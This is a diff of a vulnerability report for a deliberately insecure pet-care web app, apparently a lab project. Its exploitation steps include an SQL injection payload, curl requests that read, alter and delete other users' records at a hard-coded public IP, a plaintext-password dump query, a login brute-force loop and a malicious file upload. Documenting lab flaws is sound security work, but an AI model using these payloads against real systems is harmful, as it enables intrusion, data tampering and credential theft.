@@ -1,4 +1,4 @@
-# 🐾 PetCare Web Application – Vulnerability Report & Exploitation Guide
+# 🐾 PetCare Web Application – Vulnerability Report
 
 ## 📌 Overview
 
@@ -8,230 +8,166 @@ This document describes the **PetCare** web application, a deliberately insecure
 - **Backend**: NestJS (Node.js) running on an AWS EC2 instance, with PostgreSQL database
 - **API Base URL**: `http://18.222.134.61:3000`
 
-> ⚠️ **Important**: Because the frontend is statically hosted and the backend API is exposed, an attacker can interact directly with the API using tools like **Burp Suite**, **Postman**, or **cURL** – even without the frontend. This is the core of how these vulnerabilities are exploited.
+> ⚠️ **Important**: The frontend is statically hosted and the backend API is fully exposed. An attacker can interact directly with the API using tools like **Burp Suite**, **Postman**, or **cURL** – even without the frontend. This is the core of how these vulnerabilities are exploited.
 
 ---
 
-## 🔍 How to Discover Endpoints and Capture Requests
-
-1. **Inspect the frontend code** (F12 → Sources) or use **Burp Suite** to intercept traffic.
-2. The frontend uses a constant `API_BASE = 'http://18.222.134.61:3000'`. All endpoints are built from this base.
-3. Common endpoints:
-   - `POST /users/register` – register a new user
-   - `POST /users/login` – authenticate and get JWT
-   - `GET /pets/me` – get the current user's pet
-   - `POST /pets` – create a pet (uses authenticated user's ID)
-   - `GET /pets/search?name=...` – search pets (vulnerable to SQLi)
-   - `GET /pets/:id` – get any pet by ID (no ownership check)
-   - `PATCH /pets/:id` – update any pet (no ownership check)
-   - `DELETE /pets/:id` – delete any pet (no ownership check)
-   - `POST /pets/:userId` – create a pet for any user (vulnerable)
-
-4. You can use **cURL**, **Postman**, or **Burp** to send raw HTTP requests to any of these endpoints.
-
----
-
-## 🧨 List of Vulnerabilities & Exploitation Steps
+## 🧨 Main Vulnerabilities
 
 ### 1. SQL Injection (A05:2025 – Injection)
 
-**Location:** `GET /pets/search?name=...`  
-**Description:** The backend concatenates the `name` parameter directly into a SQL query without parameterization.  
-**Impact:** An attacker can retrieve all pets from the database, bypassing search logic.
+**Location:** `GET /pets/search?name=...`
 
-#### Exploitation (via browser or curl):
+**Description:**  
+The backend concatenates the `name` parameter directly into a SQL query without using parameterization or an ORM's safe query builder. This allows an attacker to inject arbitrary SQL commands.
+
+**Impact:**  
+An attacker can retrieve all pets from the database, bypassing search logic, and potentially extract sensitive data from other tables.
+
+**How to Exploit:**
 
 - **Via Frontend**: In the dashboard search bar, enter:
   ```
   ' OR '1'='1
   ```
-  Click **Search**. The page will display **all** pets in the database.
+  Click **Search**. The page will display **all** pets in the database, not just those matching the search term.
 
 - **Via cURL**:
   ```bash
   curl -X GET "http://18.222.134.61:3000/pets/search?name=' OR '1'='1" \
        -H "Authorization: Bearer <YOUR_JWT_TOKEN>"
   ```
-  Response returns all pet records.
 
-**Screenshot to capture:** Request/response showing all pets returned, including those belonging to other users.
-
----
-
-### 2. Broken Access Control – View Any Pet (A01:2025)
-
-**Location:** `GET /pets/:id`  
-**Description:** No ownership check; any authenticated user can retrieve any pet by its numeric ID.  
-**Impact:** An attacker can view sensitive pet information of other users.
-
-#### Exploitation:
-
-1. **Obtain a pet ID** – from search results (e.g., ID `1`, `2`, etc.) or by brute-forcing.
-2. Send a GET request:
-   ```bash
-   curl -X GET "http://18.222.134.61:3000/pets/1" \
-        -H "Authorization: Bearer <YOUR_TOKEN>"
-   ```
-3. The response contains full details of the pet, even if it belongs to another user.
-
-**Screenshot to capture:** Two separate authenticated users – User A creates a pet, User B requests `GET /pets/1` and sees it.
+**Screenshot to capture:** The search request and response showing all pets returned, including those belonging to other users.
 
 ---
 
-### 3. Broken Access Control – Create Pet for Any User
+### 2. Broken Access Control (A01:2025) – Combined
 
-**Location:** `POST /pets/:userId`  
-**Description:** The endpoint accepts a `userId` in the path, and the backend does not verify that the authenticated user matches that `userId`.  
-**Impact:** An attacker can create pets assigned to any user, potentially leading to data pollution or impersonation.
+**Description:**  
+The application lacks proper authorization checks on multiple endpoints. Any authenticated user can access, modify, or delete resources belonging to other users. The backend exposes endpoints that accept user IDs or pet IDs in the URL path without verifying that the authenticated user owns the resource.
 
-#### Exploitation:
+**Impact:**  
+An attacker can:
+- View any user's pet details
+- Create pets for any user
+- Modify or delete any pet
 
-- **In Postman/Burp**:
-  - Method: `POST`
-  - URL: `http://18.222.134.61:3000/pets/<TARGET_USER_UUID>`
-  - Headers: `Authorization: Bearer <YOUR_TOKEN>` (your own valid token)
-  - Body (form-data or JSON): `{ "name": "HackedPet", "breed": "Test", "size": "medium", "age": 2 }`
+**How to Exploit:**
+
+#### a) View Any Pet – `GET /pets/:id`
+- Obtain a pet ID (e.g., from search results or by brute‑forcing numeric IDs like `1`, `2`, `3`).
+- Send a GET request:
+  ```bash
+  curl -X GET "http://18.222.134.61:3000/pets/1" \
+       -H "Authorization: Bearer <YOUR_TOKEN>"
+  ```
+- The response returns full pet details, even if it belongs to another user.
+
+#### b) Create Pet for Any User – `POST /pets/:userId`
+- Find the target user's ID (e.g., from the database or by guessing UUIDs).
+- Send a POST request:
+  ```bash
+  curl -X POST "http://18.222.134.61:3000/pets/<TARGET_USER_UUID>" \
+       -H "Authorization: Bearer <YOUR_TOKEN>" \
+       -H "Content-Type: application/json" \
+       -d '{"name":"HackedPet","breed":"Test","size":"medium","age":2}'
+  ```
 - The pet is created with `ownerId = <TARGET_USER_UUID>`, even though you are not that user.
 
-**Screenshot to capture:** Show the request with a different `userId` and the response confirming creation; then fetch `GET /pets/me` for that target user and see the pet.
-
----
-
-### 4. Broken Access Control – Update/Delete Any Pet
-
-**Location:** `PATCH /pets/:id`, `DELETE /pets/:id`  
-**Description:** No ownership verification; any authenticated user can modify or delete any pet.  
-**Impact:** Attackers can vandalize or remove other users' pets.
-
-#### Exploitation:
-
-- To update:
+#### c) Update Any Pet – `PATCH /pets/:id`
   ```bash
   curl -X PATCH "http://18.222.134.61:3000/pets/1" \
        -H "Authorization: Bearer <YOUR_TOKEN>" \
        -H "Content-Type: application/json" \
-       -d '{"name": "ModifiedName"}'
+       -d '{"name":"ModifiedName"}'
   ```
-- To delete:
+
+#### d) Delete Any Pet – `DELETE /pets/:id`
   ```bash
   curl -X DELETE "http://18.222.134.61:3000/pets/1" \
        -H "Authorization: Bearer <YOUR_TOKEN>"
   ```
 
-**Screenshot to capture:** Before/after – pet belonging to another user is updated or deleted.
+**Screenshot to capture:** Two separate authenticated users – User A creates a pet, User B requests `GET /pets/1`, `PATCH /pets/1`, or `DELETE /pets/1` and succeeds.
 
 ---
 
-### 5. Plaintext Passwords (A07 – Authentication Failures)
+### 3. Authentication Failures (A07:2025) – Combined
 
-**Location:** Database table `user` – column `password`.  
-**Description:** Passwords are stored in the database **as plain text** (no hashing).  
-**Impact:** Anyone with database access (e.g., through SQL injection or compromised credentials) can read all user passwords.
+**Description:**  
+The application stores passwords in plain text and enforces a weak password policy, making user accounts highly vulnerable to compromise.
 
-#### Exploitation:
+**Impact:**  
+- Anyone with database access can read all user passwords.
+- Users can choose easily guessable passwords (e.g., `"a"`, `"123"`), facilitating brute‑force attacks.
 
-1. Connect to the PostgreSQL database (if you have credentials) or use a SQL injection (e.g., on another endpoint) to dump the table.
-2. Simple query:
-   ```sql
-   SELECT email, password FROM "user";
-   ```
-3. Output reveals passwords like `"123456"`, `"password"`, etc.
+**How to Exploit:**
 
-**Screenshot to capture:** Output of the SQL query showing emails and plaintext passwords.
+#### a) Plaintext Passwords
+Connect to the PostgreSQL database and query the `user` table:
+```sql
+SELECT email, password FROM "user";
+```
+Output reveals passwords like `"123456"`, `"password"`, etc., stored as plain text.
 
----
+#### b) Weak Password Policy
+Register a user with a weak password (e.g., one character):
+```bash
+curl -X POST "http://18.222.134.61:3000/users/register" \
+     -H "Content-Type: application/json" \
+     -d '{"email":"weak@example.com","password":"a","fullName":"Weak User"}'
+```
+The registration succeeds, demonstrating the lack of password complexity requirements.
 
-### 6. Weak Password Policy (A07 – Authentication Failures)
-
-**Location:** User registration DTO (`CreateUserDto`).  
-**Description:** The only validation is `@MinLength(1)`, meaning any non‑empty string is accepted, including `"a"` or `"123"`.  
-**Impact:** Users can choose easily guessable passwords, facilitating brute‑force attacks.
-
-#### Exploitation:
-
-- Register a user with password `"a"`:
-  ```bash
-  curl -X POST "http://18.222.134.61:3000/users/register" \
-       -H "Content-Type: application/json" \
-       -d '{"email":"weak@example.com","password":"a","fullName":"Weak User"}'
-  ```
-- The registration succeeds.
-
-**Screenshot to capture:** Registration request with a one‑character password and the success response.
+**Screenshot to capture:** The SQL query output showing emails and plaintext passwords; the registration request with a one‑character password and the success response.
 
 ---
 
-### 7. Missing Security Logging & Alerting (A09)
+### 4. Insecure File Upload (Optional)
 
-**Location:** No logging of authentication failures, sensitive actions, or access control violations.  
-**Description:** The application does not record any audit trails (e.g., failed login attempts, pet viewing by unauthorized users).  
-**Impact:** Attackers can brute‑force or exploit vulnerabilities without detection.
+**Location:** `POST /pets` – file upload field `image`
 
-#### Exploitation:
+**Description:**  
+The server does not validate the file type or content. Any file is saved to the `uploads/` directory and becomes publicly accessible via the `/uploads/` route.
 
-1. Perform multiple failed login attempts:
-   ```bash
-   for i in {1..10}; do curl -X POST http://18.222.134.61:3000/users/login -H "Content-Type: application/json" -d '{"email":"test@example.com","password":"wrong"}'; done
-   ```
-2. Check the server logs (PM2 logs):
-   ```bash
-   pm2 logs pet-backend --lines 50
-   ```
-3. Observe that there are no entries indicating failed logins or unusual activity.
+**Impact:**  
+An attacker could upload a malicious file (e.g., a `.html` with JavaScript for XSS, a `.php` shell if PHP is installed, or a `.txt` file with malicious content) and potentially execute it or use it for phishing.
 
-**Screenshot to capture:** The loop of requests and the PM2 log output showing no security events.
+**How to Exploit:**
 
----
+Upload a `.txt` file instead of an image:
+```bash
+curl -X POST "http://18.222.134.61:3000/pets" \
+     -H "Authorization: Bearer <TOKEN>" \
+     -F "name=Evil" -F "breed=Test" -F "size=medium" -F "age=1" \
+     -F "image=@malicious.txt"
+```
+The file is stored in `uploads/` with a random name. Access it via:
+```
+http://18.222.134.61:3000/uploads/<filename>.txt
+```
 
-### 8. No Rate Limiting (Mishandling of Exceptional Conditions)
-
-**Location:** Login endpoint and other protected endpoints.  
-**Description:** There is no mechanism to limit the number of requests from a single client.  
-**Impact:** An attacker can perform brute‑force attacks on passwords or other endpoints without being blocked.
-
-#### Exploitation:
-
-- Send many login requests in a short time (e.g., 100 requests in 5 seconds).
-- Observe that all are accepted (the server returns `200` for correct credentials or `401` for wrong ones), but no `429 Too Many Requests` response.
-
-**Screenshot to capture:** A sequence of rapid login attempts with timestamps showing no throttling.
+**Screenshot to capture:** The upload request and the file being served from the `/uploads` endpoint.
 
 ---
 
-### 9. Insecure File Upload (Optional)
+## 📝 Additional Considerations (Side Notes)
 
-**Location:** `POST /pets` – file upload field `image`.  
-**Description:** The server does not validate the file type or contents; any file is saved to the `uploads/` directory and becomes publicly accessible.  
-**Impact:** An attacker could upload a malicious file (e.g., a PHP shell, HTML with JavaScript) and potentially execute it if the server configuration allows.
+### 1. Missing Security Logging & Alerting (A09)
+- No logs are generated for authentication failures, access control violations, or other security‑relevant events.
+- **Impact:** Attackers can brute‑force or exploit vulnerabilities without detection.
+- **Demonstration:** Perform multiple failed login attempts and check PM2 logs – no security events are recorded.
 
-#### Exploitation:
+### 2. No Rate Limiting (Mishandling of Exceptional Conditions)
+- There is no mechanism to limit the number of requests from a single client.
+- **Impact:** Attackers can brute‑force passwords or other endpoints without being blocked.
+- **Demonstration:** Send many login requests in a short time – all are accepted, and no `429 Too Many Requests` response is returned.
 
-1. Upload a `.txt` file instead of an image:
-   ```bash
-   curl -X POST "http://18.222.134.61:3000/pets" \
-        -H "Authorization: Bearer <TOKEN>" \
-        -F "name=Evil" -F "breed=Test" -F "size=medium" -F "age=1" \
-        -F "image=@malicious.txt"
-   ```
-2. The file is stored in `uploads/` with a random name.
-3. Access it via `http://18.222.134.61:3000/uploads/<filename>.txt`.
-4. The file is served as plain text (or HTML if uploaded as .html), potentially allowing XSS or phishing.
-
-**Screenshot to capture:** Upload request and the file being served from the `/uploads` endpoint.
-
----
-
-### 10. No HTTPS (Missing Transport Encryption)
-
-**Description:** All traffic between client and server is sent over **HTTP** (no encryption).  
-**Impact:** An attacker on the network can intercept and read all data, including passwords and JWT tokens (Man‑in‑the‑Middle).
-
-#### Exploitation:
-
-- Use **Wireshark** or **Burp Suite** to capture HTTP traffic and observe that login requests contain plaintext credentials.
-- The browser also warns about insecure connection (no padlock).
-
-**Screenshot to capture:** Request payload showing password in clear text, and the browser URL bar showing `http://`.
+### 3. No HTTPS (Missing Transport Encryption)
+- All traffic is sent over HTTP (no encryption).
+- **Impact:** An attacker on the network can intercept and read all data, including passwords and JWT tokens (Man‑in‑the‑Middle).
+- **Demonstration:** Use Burp Suite or Wireshark to capture a login request and see the password in clear text.
 
 ---
 
@@ -246,13 +182,16 @@ This document describes the **PetCare** web application, a deliberately insecure
 
 ## 🔐 Security Recommendations (for future fixes)
 
-1. Use **parameterized queries** or an ORM properly (TypeORM's query builder with parameters).
-2. Implement **ownership checks** on every endpoint that accesses or modifies resources.
+1. Use **parameterized queries** or TypeORM's safe query builder (e.g., `where: { name: name }`).
+2. Implement **ownership checks** on every endpoint that accesses or modifies resources:
+   ```typescript
+   if (pet.ownerId !== req.user.id) throw new ForbiddenException();
+   ```
 3. Hash passwords using **bcrypt** or **Argon2** before storing.
 4. Enforce a strong **password policy** (min length 8, complexity).
 5. Add **logging** for authentication events, access control violations, and errors; monitor logs.
 6. Implement **rate limiting** (e.g., with `@nestjs/throttler`).
-7. Validate file uploads (type, size, content) and store them outside the web root or use a dedicated service.
+7. Validate file uploads (type, size, content) and store files in a non‑public directory or use a dedicated storage service.
 8. Enforce **HTTPS** using a reverse proxy (Nginx) and Let's Encrypt.
 
 ---
